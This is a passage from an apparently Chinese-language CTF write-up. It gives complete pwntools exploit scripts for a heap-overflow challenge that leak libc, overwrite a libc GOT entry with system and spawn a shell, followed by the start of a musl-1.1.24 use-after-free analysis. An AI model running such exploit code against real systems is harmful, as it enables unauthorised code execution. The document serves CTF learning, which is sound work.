class="built_in">bytes</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Your chocie:&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;1 &quot;</span> + data</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    payload = <span class="string">b&quot;2 &quot;</span> + <span class="built_in">bytes</span>(index)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Your chocie:&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;3 &quot;</span> + <span class="built_in">bytes</span>(index) + <span class="string">b&quot;:&quot;</span> + data</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    payload = <span class="string">b&quot;4 &quot;</span> + <span class="built_in">bytes</span>(index)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*(<span class="number">0x68</span>-<span class="number">6</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>+<span class="string">b&quot;b&quot;</span>*<span class="number">8</span>+p16(<span class="number">0x8a0</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;1&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">b&quot;2&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">b&quot;3&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input the new paper content&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;paper content: &quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x219c80</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">stack_libc = libc_base + <span class="number">0x21aa20</span></span><br><span class="line">one_gadgets = [<span class="number">0x50a37</span>,<span class="number">0xebcf1</span>,<span class="number">0xebcf5</span>,<span class="number">0xebcf8</span>,<span class="number">0xebd52</span>,<span class="number">0xebdaf</span>,<span class="number">0xebdb3</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">1</span>] + libc_base</span><br><span class="line">success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line">success(<span class="string">&quot;stack_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_libc))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;1 &quot;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">0x68</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>+<span class="string">b&quot;b&quot;</span>*<span class="number">8</span>+p64(stack_libc))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;1&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">b&quot;2&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input the new paper content&quot;</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot;paper content: &quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">stack_addr = leak_addr - <span class="number">0x110</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;1 &quot;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">0x68</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>+<span class="string">b&quot;b&quot;</span>*<span class="number">8</span>+p64(stack_addr))</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;1&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">b&quot;2&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input the new paper content&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;3 &quot;</span> + <span class="built_in">bytes</span>(<span class="number">6</span>) + <span class="string">b&quot;:&quot;</span> + p64(system_libc)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input the new paper content&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;5 /bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>更优化的方法是打 libc got，在 GDB 中查看可用的 got：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f3a80619008</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f3a80619008</span> (_GLOBAL_OFFSET_TABLE_+<span class="number">8</span>) —▸ <span class="number">0x7f3a806e94c0</span> —▸ <span class="number">0x7f3a80400000</span> ◂— <span class="number">0x3010102464c457f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f3a80619010</span> (_GLOBAL_OFFSET_TABLE_+<span class="number">16</span>) —▸ <span class="number">0x7f3a80700d30</span> (_dl_runtime_resolve_xsavec) ◂— endbr64 </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f3a80619018</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a805b3e80</span> (__strnlen_evex) ◂— endbr64 </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f3a80619020</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a805afca0</span> (__rawmemchr_evex) ◂— endbr64 </span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f3a80619028</span> (<span class="built_in">realloc</span>@got[plt]) —▸ <span class="number">0x7f3a80428030</span> ◂— endbr64 </span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f3a80619030</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a8059b930</span> (__strncasecmp_avx) ◂— endbr64 </span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f3a80619038</span> (_dl_exception_create@got.plt) —▸ <span class="number">0x7f3a80428050</span> ◂— endbr64 </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f3a80619040</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a805aef00</span> (__mempcpy_evex_unaligned_erms) ◂— endbr64 </span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7f3a80619048</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a805afa90</span> (__wmemset_evex_unaligned) ◂— endbr64 </span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7f3a80619050</span> (<span class="built_in">calloc</span>@got[plt]) —▸ <span class="number">0x7f3a80428080</span> ◂— endbr64 </span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7f3a80619058</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a80598990</span> (__strspn_sse42) ◂— endbr64 </span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7f3a80619060</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a805ae680</span> (__memchr_evex) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7f3a80619068</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a805aef40</span> (__memmove_evex_unaligned_erms) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7f3a80619070</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a805b5700</span> (__wmemchr_evex) ◂— endbr64 </span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7f3a80619078</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a805afe20</span> (__stpcpy_evex) ◂— endbr64 </span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x7f3a80619080</span> (*ABS*@got.plt) —▸ <span class="number">0x7f3a805b5a00</span> (__wmemcmp_evex_movbe) ◂— endbr64 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>通过看别人博客发现 <code>__strspn_sse42</code> 比较好用</li>
<li>经过测试，需要把 <code>0x7f3a80619040-0x7f3a80619050</code>（<code>__strspn_sse42</code> 往上 0x18 字节）都破坏掉，然后在 <code>__strspn_sse42</code> 上放入 <code>system</code> 才能打通（不然会有段错误）</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./heap1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-3.35.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x18BD)\nb *$rebase(0x1A02)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your chocie:&quot;</span>,<span class="built_in">bytes</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Your chocie:&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;1 &quot;</span> + data</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    payload = <span class="string">b&quot;2 &quot;</span> + <span class="built_in">bytes</span>(index)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Your chocie:&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&quot;3 &quot;</span> + <span class="built_in">bytes</span>(index) + <span class="string">b&quot;:&quot;</span> + data</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    payload = <span class="string">b&quot;4 &quot;</span> + <span class="built_in">bytes</span>(index)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*(<span class="number">0x68</span>-<span class="number">6</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>+<span class="string">b&quot;b&quot;</span>*<span class="number">8</span>+p16(<span class="number">0x8a0</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;1&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">b&quot;2&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">b&quot;3&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input the new paper content&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;paper content: &quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x219c80</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">libc_got = libc_base + <span class="number">0x219058</span> - <span class="number">0x18</span></span><br><span class="line">success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line">success(<span class="string">&quot;libc_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_got))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;1 &quot;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">0x68</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>+<span class="string">b&quot;b&quot;</span>*<span class="number">8</span>+p64(libc_got))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;1&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">b&quot;2&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input the new paper content&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;3 &quot;</span> + <span class="built_in">bytes</span>(<span class="number">4</span>) + <span class="string">b&quot;:&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p64(system_libc)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input the new paper content&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="cookieBox"><a href="#cookieBox" class="headerlink" title="cookieBox"></a>cookieBox</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/cnitlrt/aaa/XCTF_2020_PWN_musl/source/musl<span class="number">-1.1</span><span class="number">.24</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v27 = <span class="string">&quot; [args]&quot;</span>;</span><br><span class="line">v28 = (<span class="keyword">size_t</span>)base;</span><br><span class="line">v29 = <span class="string">&quot;1.1.24&quot;</span>;</span><br><span class="line">v30 = <span class="string">&quot;musl libc (x86_64)\nVersion %s\nDynamic Program Loader\nUsage: %s [options] [--] pathname%s\n&quot;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>musl 版本：1.1.24</li>
<li>调试符号下载网站：<a target="_blank" rel="noopener" href="https://git.musl-libc.org/cgit/musl">musl - musl - an implementation of the standard library for Linux-based systems (musl-libc.org)</a> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cookieBox: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/cnitlrt/aaa/XCTF_2020_PWN_musl/source/musl<span class="number">-1.1</span><span class="number">.24</span>/build/lib/ld-musl-x86_64.so<span class="number">.1</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>有 UAF 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">0xF</span> &amp;&amp; chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">  size_list[index] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以对同一个 chunk 释放多次</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>先搭建调试环境：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf musl-1.1.24.tar.gz</span><br><span class="line">cd musl-1.1.24</span><br><span class="line">sudo su</span><br><span class="line">./configure --prefix=/usr/local/musl CFLAGS=&#x27;-O2 -v -g&#x27; --enable-debug=yes</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<ul>
<li>设置 <code>-g</code> 方便查看程序在哪里报错</li>
</ul>
<p>打印 mal 结构体即可查看详细信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p mal</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  binmap = <span class="number">343597383680</span>,</span><br><span class="line">  bins = &#123;&#123;</span><br><span class="line">      lock = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">      head = <span class="number">0x0</span>,</span><br><span class="line">      tail = <span class="number">0x0</span></span><br><span class="line">    &#125; &lt;repeats <span class="number">36</span> times&gt;, &#123;</span><br><span class="line">      lock = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">      head = <span class="number">0x7fe5b69c0710</span>,</span><br><span class="line">      tail = <span class="number">0x7fe5b69c0710</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      lock = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">      head = <span class="number">0x7fe5b69bde38</span> &lt;mal+<span class="number">888</span>&gt;,</span><br><span class="line">      tail = <span class="number">0x7fe5b69bde38</span> &lt;mal+<span class="number">888</span>&gt;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      lock = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">      head = <span class="number">0x6021f0</span>,</span><br><span class="line">      tail = <span class="number">0x6021f0</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      lock = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">      head = <span class="number">0x0</span>,</span><br><span class="line">      tail = <span class="number">0x0</span></span><br><span class="line">    &#125; &lt;repeats <span class="number">25</span> times&gt;&#125;,</span><br><span class="line">  free_lock = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般对于 musl-1.1.x 的入侵手段就是 FSOP，先利用 UAF 申请到 <code>__stdout_FILE</code></p>
<p>最开始我的思路是劫持 bins，但试了好几次发现自己伪造的 chunk 会触发段错误：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x7f4cc63a2674</span> &lt;<span class="built_in">malloc</span>+<span class="number">820</span>&gt;    mov    qword ptr [rdx + <span class="number">0x10</span>], rax</span><br><span class="line">► <span class="number">0x7f4cc63a2678</span> &lt;<span class="built_in">malloc</span>+<span class="number">824</span>&gt;    mov    qword ptr [rax + <span class="number">0x18</span>], rdx   &lt;mal+<span class="number">72</span>&gt;</span><br><span class="line">  <span class="number">0x7f4cc63a267c</span> &lt;<span class="built_in">malloc</span>+<span class="number">828</span>&gt;    mov    rax, qword ptr [r8 + <span class="number">8</span>]</span><br></pre></td></tr></table></figure>
<p>对应的源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">	a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br></pre></td></tr></table></figure>
<ul>
<li>调试发现 <code>c</code> 就是我们伪造 chunk 的地址，而后续的 unlink 操作极有可能发送段错误</li>
<li>即使尝试用 <code>__stdout_FILE &amp;&amp; __stdin_FILE</code> 上的可写地址来绕过，最后也会因为 <code>puts</code> 异常而发生段错误</li>
</ul>
<p>最后想到可以先利用 unbin 往 <code>__stdout_FILE</code> 中写一个合法地址，然后在基于这个地址伪造 fake chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lock = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">head = <span class="number">0x7f3056ddc3b0</span>,</span><br><span class="line">tail = <span class="number">0x7f3056ddc530</span></span><br></pre></td></tr></table></figure>
